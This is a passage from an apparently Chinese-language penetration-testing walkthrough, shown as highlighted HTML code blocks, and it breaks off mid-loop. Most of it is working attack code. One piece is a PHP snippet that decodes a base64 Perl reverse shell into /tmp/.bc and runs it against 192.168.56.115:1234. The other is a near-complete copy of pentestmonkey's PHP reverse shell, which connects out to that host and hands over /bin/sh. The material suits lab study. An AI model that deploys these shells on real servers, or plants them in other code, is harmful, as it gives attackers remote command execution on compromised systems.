string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span><span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token function">cf</span><span class="token punctuation">(</span><span class="token string">'/tmp/.bc'</span><span class="token punctuation">,</span>$back_connect<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="51"></td><td><pre>$res <span class="token operator">=</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token function">which</span><span class="token punctuation">(</span><span class="token string">'perl'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" /tmp/.bc $yourip $yourport &amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token operator">?</span><span class="token operator">></span></pre></td></tr></table></figure><p>修改 <code>ip</code> 和 <code>监听端口</code> ：</p><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>$yourip <span class="token operator">=</span> <span class="token string">"192.168.56.115"</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="2"></td><td><pre>$yourport <span class="token operator">=</span> <span class="token string">'1234'</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>方法二，使用 <code>kali自带</code> 的 <code>php马</code> ：</p><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181526537-1871639242.png" alt="image"></p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">// for any actions performed using this tool.  The author accepts no liability</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">// do not use this tool.</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">// In all other respects the GPL version 2 applies:</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">// This program is free software; you can redistribute it and/or modify</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">// it under the terms of the GNU General Public License version 2 as</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// published by the Free Software Foundation.</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token comment">// This program is distributed in the hope that it will be useful,</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token comment">// GNU General Public License for more details.</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token comment">// You should have received a copy of the GNU General Public License along</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token comment">// This tool may be used for legal purposes only.  Users take full responsibility</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token comment">// for any actions performed using this tool.  If these terms are not acceptable to</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token comment">// you, then do not use this tool.</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token comment">// You are encouraged to send comments, improvements or suggestions to</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token comment">// me at pentestmonkey@pentestmonkey.net</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token comment">// Description</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token comment">// -----------</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token comment">// The recipient will be given a shell running as the current user (apache normally).</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment">// Limitations</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token comment">// -----------</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token comment">// Usage</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token comment">// -----</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span></pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token function">set_time_limit</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token variable">$VERSION</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1.0"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'192.168.56.115'</span><span class="token punctuation">;</span>  <span class="token comment">// CHANGE THIS</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">1234</span><span class="token punctuation">;</span>       <span class="token comment">// CHANGE THIS</span></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token variable">$chunk_size</span> <span class="token operator">=</span> <span class="token number">1400</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token variable">$write_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token variable">$error_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'uname -a; w; id; /bin/sh -i'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token variable">$debug</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token comment">// Daemonise ourself if possible to avoid zombies later</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="61"></td><td><pre></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span></pre></td></tr><tr><td data-num="63"></td><td><pre><span class="token comment">// our php process and avoid zombies.  Worth a try...</span></pre></td></tr><tr><td data-num="64"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pcntl_fork'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>	<span class="token comment">// Fork and have the parent process exit</span></pre></td></tr><tr><td data-num="66"></td><td><pre>	<span class="token variable">$pid</span> <span class="token operator">=</span> <span class="token function">pcntl_fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>	</pre></td></tr><tr><td data-num="68"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't fork"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="70"></td><td><pre>		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>	</pre></td></tr><tr><td data-num="73"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Parent exits</span></pre></td></tr><tr><td data-num="75"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="76"></td><td><pre></pre></td></tr><tr><td data-num="77"></td><td><pre>	<span class="token comment">// Make the current process a session leader</span></pre></td></tr><tr><td data-num="78"></td><td><pre>	<span class="token comment">// Will only succeed if we forked</span></pre></td></tr><tr><td data-num="79"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">posix_setsid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error: Can't setsid()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>		<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="83"></td><td><pre></pre></td></tr><tr><td data-num="84"></td><td><pre>	<span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="85"></td><td><pre><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="86"></td><td><pre>	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="87"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="88"></td><td><pre></pre></td></tr><tr><td data-num="89"></td><td><pre><span class="token comment">// Change to a safe directory</span></pre></td></tr><tr><td data-num="90"></td><td><pre><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="91"></td><td><pre></pre></td></tr><tr><td data-num="92"></td><td><pre><span class="token comment">// Remove any umask we inherited</span></pre></td></tr><tr><td data-num="93"></td><td><pre><span class="token function">umask</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="94"></td><td><pre></pre></td></tr><tr><td data-num="95"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="96"></td><td><pre><span class="token comment">// Do the reverse shell...</span></pre></td></tr><tr><td data-num="97"></td><td><pre><span class="token comment">//</span></pre></td></tr><tr><td data-num="98"></td><td><pre></pre></td></tr><tr><td data-num="99"></td><td><pre><span class="token comment">// Open reverse connection</span></pre></td></tr><tr><td data-num="100"></td><td><pre><span class="token variable">$sock</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="101"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="102"></td><td><pre>	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$errstr</span></span> (<span class="token interpolation"><span class="token variable">$errno</span></span>)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="103"></td><td><pre>	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="104"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="105"></td><td><pre></pre></td></tr><tr><td data-num="106"></td><td><pre><span class="token comment">// Spawn shell process</span></pre></td></tr><tr><td data-num="107"></td><td><pre><span class="token variable">$descriptorspec</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="108"></td><td><pre>   <span class="token number">0</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// stdin is a pipe that the child will read from</span></pre></td></tr><tr><td data-num="109"></td><td><pre>   <span class="token number">1</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// stdout is a pipe that the child will write to</span></pre></td></tr><tr><td data-num="110"></td><td><pre>   <span class="token number">2</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span>   <span class="token comment">// stderr is a pipe that the child will write to</span></pre></td></tr><tr><td data-num="111"></td><td><pre><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="112"></td><td><pre></pre></td></tr><tr><td data-num="113"></td><td><pre><span class="token variable">$process</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">,</span> <span class="token variable">$descriptorspec</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="114"></td><td><pre></pre></td></tr><tr><td data-num="115"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="116"></td><td><pre>	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't spawn shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="117"></td><td><pre>	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="118"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="119"></td><td><pre></pre></td></tr><tr><td data-num="120"></td><td><pre><span class="token comment">// Set everything to non-blocking</span></pre></td></tr><tr><td data-num="121"></td><td><pre><span class="token comment">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span></pre></td></tr><tr><td data-num="122"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="123"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="124"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="125"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="126"></td><td><pre></pre></td></tr><tr><td data-num="127"></td><td><pre><span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successfully opened reverse shell to <span class="token interpolation"><span class="token variable">$ip</span></span>:<span class="token interpolation"><span class="token variable">$port</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="128"></td><td><pre></pre></td></tr><tr><td data-num="129"></td><td><pre><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="130"></td><td><pre>	<span class="token comment">// Check for end of TCP connection</span></pre></td></tr><tr><td data-num="131"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="132"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell connection terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="133"></td><td><pre>		<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="134"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="135"></td><td><pre></pre></td></tr><tr><td data-num="136"></td><td><pre>	<span class="token comment">// Check for end of STDOUT</span></pre></td></tr><tr><td data-num="137"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="138"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell process terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="139"></td><td><pre>		<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="140"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="141"></td><td><pre></pre></td></tr><tr><td data-num="142"></td><td><pre>	<span class="token comment">// Wait until a command is end down $sock, or some</span></pre></td></tr><tr><td data-num="143"></td><td><pre>	<span class="token comment">// command output is available on STDOUT or STDERR</span></pre></td></tr><tr><td data-num="144"></td><td><pre>	<span class="token variable">$read_a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="145"></td><td><pre>	<span class="token variable">$num_changed_sockets</span> <span class="token operator">=</span> <span class="token function">stream_select</span><span class="token punctuation">(</span><span class="token variable">$read_a</span><span class="token punctuation">,</span> <span class="token variable">$write_a</span><span class="token punctuation">,</span> <span class="token variable">$error_a</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="146"></td><td><pre></pre></td></tr><tr><td data-num="147"></td><td><pre>	<span class="token comment">// If we can read from the TCP socket, send</span></pre></td></tr><tr><td data-num="148"></td><td><pre>	<span class="token comment">// data to process's STDIN</span></pre></td></tr><tr><td data-num="149"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="150"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="151"></td><td><pre>		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="152"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="153"></td><td><pre>		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="154"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="155"></td><td><pre></pre></td></tr><tr><td data-num="156"></td><td><pre>	<span class="token comment">// If we can read from the process's STDOUT</span></pre></td></tr><tr><td data-num="157"></td><td><pre>	<span class="token comment">// send data down tcp connection</span></pre></td></tr><tr><td data-num="158"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="159"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="160"></td><td><pre>		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="161"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="162"></td><td><pre>		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="163"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="164"></td><td><pre></pre></td></tr><tr><td data-num="165"></td><td><pre>	<span class="token comment">// If we can read from the process's STDERR</span></pre></td></tr><tr><td data-num="166"></td><td><pre>	<span class="token comment">// send data down tcp connection</span></pre></td></tr><tr><td data-num="167"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="168"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="169"></td><td><pre>		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="170"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="171"></td><td><pre>		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="172"></td><td><pre>	